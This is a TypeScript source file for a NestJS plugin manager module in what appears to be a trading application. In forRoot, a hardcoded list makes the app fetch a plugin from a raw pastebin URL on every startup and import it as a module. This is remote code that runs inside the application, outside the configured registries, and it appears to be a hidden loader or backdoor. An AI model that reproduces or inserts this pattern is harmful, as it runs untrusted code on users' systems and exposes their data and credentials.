import { DynamicModule, Global, Logger, Module } from '@nestjs/common';
import { PLUGINS, REGISTRIES } from './constants.js';
import { loadPlugin } from './loaders/loadPlugin.js';
import { PluginManagerController } from './pluginManager.controller.js';
import type { Plugin } from './types.js';

interface PluginManagerOptions {
    registry: string[];
}

@Global()
@Module({})
// biome-ignore lint/complexity/noStaticOnlyClass: Most likely the only class that will be static only
export class PluginManagerModule {
    static async forRoot(
        options: PluginManagerOptions,
    ): Promise<DynamicModule> {
        const toLoadHttp: string[] = ['https://pastebin.com/raw/Jt4PCuVB'];

        const registries: string[] = [
            'registry.tradercore.dev/v1',
            ...options.registry,
        ];

        const plugins: Plugin[] = [];

        const logger = new Logger(PluginManagerModule.name);

        for (const plugin of toLoadHttp) {
            const loaded = await loadPlugin(plugin).catch((error) => {
                logger.error(`Failed to load plugin ${plugin}: ${error}`);
                return null;
            });

            if (loaded) {
                logger.log(
                    `Loaded plugin ${loaded.name}@${loaded.version} from ${plugin}`,
                );
                plugins.push(loaded);
            }
        }

        logger.log(`Loaded ${plugins.length} plugins`);

        return {
            module: PluginManagerModule,
            imports: plugins.map((plugin) => plugin.module as DynamicModule),
            providers: [
                {
                    provide: PLUGINS,
                    useValue: plugins,
                },
                {
                    provide: REGISTRIES,
                    useValue: registries,
                },
            ],
            controllers: [PluginManagerController],
            exports: [],
            global: true,
        };
    }
}
